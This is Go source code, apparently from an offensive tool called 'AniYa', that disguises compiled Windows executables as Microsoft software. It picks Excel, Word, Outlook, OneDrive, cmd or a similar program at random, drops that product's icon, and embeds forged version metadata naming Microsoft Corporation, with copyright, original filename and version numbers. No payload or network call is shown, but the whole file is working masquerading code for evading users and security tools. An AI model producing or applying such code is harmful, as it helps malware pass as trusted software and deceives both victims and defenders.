package core

import (
	"AniYa/icon"
	"fmt"
	"fyne.io/fyne/v2"
	"github.com/josephspurrier/goversioninfo"
	"io/ioutil"
	"log"
	"os"
	"path"
)

func generatesyso() {
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}
	name := Binaryname[GenerateNumer(0, 8)]
	ico := &fyne.StaticResource{}

	switch name {
	case "cmd":
		ico = icon.ResourceCmdIco
	case "Excel":
		ico = icon.ResourceExcelIco
	case "Word":
		ico = icon.ResourceWordIco
	case "lync":
		ico = icon.ResourceLyncIco
	case "Outlook":
		ico = icon.ResourceOutlookIco
	case "Powerpnt":
		ico = icon.ResourcePowerpointIco
	case "OneNote":
		ico = icon.ResourceOnenoteIco
	case "OneDrive":
		ico = icon.ResourceOnedriveIco
	}
	ioutil.WriteFile(path.Join(TempDir, ico.Name()), ico.Content(), os.ModePerm)

	FileProperties(name)
}

//goenviroment

func FileProperties(name string) string {

	fmt.Println("[*] Creating an Embedded Resource File")
	vi := &goversioninfo.VersionInfo{}

	if name == "OneNote" {
		vi.IconPath = "onenote.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "OneNote"
		vi.StringFileInfo.FileDescription = "Microsoft OneNote"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "OneNote.exe"
		vi.StringFileInfo.ProductName = "Microsoft OneNote"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20404
		vi.StringFileInfo.InternalName = "OneNote"
	} //
	if name == "Excel" {
		vi.IconPath = "excel.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "Excel"
		vi.StringFileInfo.FileDescription = "Microsoft Excel"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "Excel.exe"
		vi.StringFileInfo.ProductName = "Microsoft Office"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20838
		vi.StringFileInfo.InternalName = "Excel"
	} //
	if name == "Word" {
		vi.IconPath = "word.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "Word"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "Word.exe"
		vi.StringFileInfo.ProductName = "Microsoft Office"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20404
		vi.StringFileInfo.InternalName = "Word"
	} //
	if name == "Powerpnt" {
		vi.IconPath = "powerpoint.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.FileDescription = "Microsoft PowerPoint"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "Powerpnt.exe"
		vi.StringFileInfo.ProductName = "Microsoft Office"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20404
		vi.StringFileInfo.InternalName = "Powerpnt"
	} //
	if name == "Outlook" {
		vi.IconPath = "outlook.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "Outlook"
		vi.StringFileInfo.FileDescription = "Microsoft Outlook"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "Outlook.exe"
		vi.StringFileInfo.ProductName = "Microsoft Office"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20404
		vi.StringFileInfo.InternalName = "Outlook"
	} //
	if name == "lync" {
		vi.IconPath = "lync.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "Lync"
		vi.StringFileInfo.FileDescription = "Skype for Business"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "16.0.15330.20264"
		vi.StringFileInfo.OriginalFilename = "Lync.exe"
		vi.StringFileInfo.ProductName = "Microsoft Office"
		vi.StringFileInfo.ProductVersion = "16.0.15330.20264"
		vi.FixedFileInfo.FileVersion.Major = 16
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 14326
		vi.FixedFileInfo.FileVersion.Build = 20404
		vi.StringFileInfo.InternalName = "Lync"
	} //
	if name == "cmd" {
		vi.IconPath = "cmd.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "Cmd.exe"
		vi.StringFileInfo.FileDescription = "Windows Command Processor"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "10.0.19041.746"
		vi.StringFileInfo.OriginalFilename = "Cmd.exe"
		vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
		vi.StringFileInfo.ProductVersion = "10.0.19041.746"
		vi.FixedFileInfo.FileVersion.Major = 10
		vi.FixedFileInfo.FileVersion.Minor = 0
		vi.FixedFileInfo.FileVersion.Patch = 1
		vi.FixedFileInfo.FileVersion.Build = 19041
		vi.StringFileInfo.InternalName = "Cmd.exe"
	} //
	if name == "OneDrive" {
		vi.IconPath = "onedrive.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = "OneDrive.exe"
		vi.StringFileInfo.FileDescription = "Microsoft OneDrive"
		vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
		vi.StringFileInfo.FileVersion = "22.141.703.2"
		vi.StringFileInfo.OriginalFilename = "OneDrive.exe"
		vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
		vi.StringFileInfo.ProductVersion = "22.141.0703.0002"
		vi.FixedFileInfo.FileVersion.Major = 21
		vi.FixedFileInfo.FileVersion.Minor = 170
		vi.FixedFileInfo.FileVersion.Patch = 2
		vi.FixedFileInfo.FileVersion.Build = 822
		vi.StringFileInfo.InternalName = "OneDrive.exe"
	} //

	vi.StringFileInfo.CompanyName = "Microsoft Corporation"

	vi.Build()
	vi.Walk()

	var archs []string
	archs = []string{"amd64"}
	for _, item := range archs {
		fileout := "resource_windows.syso"
		if err := vi.WriteSyso(path.Join(TempDir, fileout), item); err != nil {
			log.Printf("Error writing syso: %v", err)
			os.Exit(3)
		}
	}
	fmt.Println("[+] Created Embedded Resource File With " + name + "'s Properties")
	return name
}
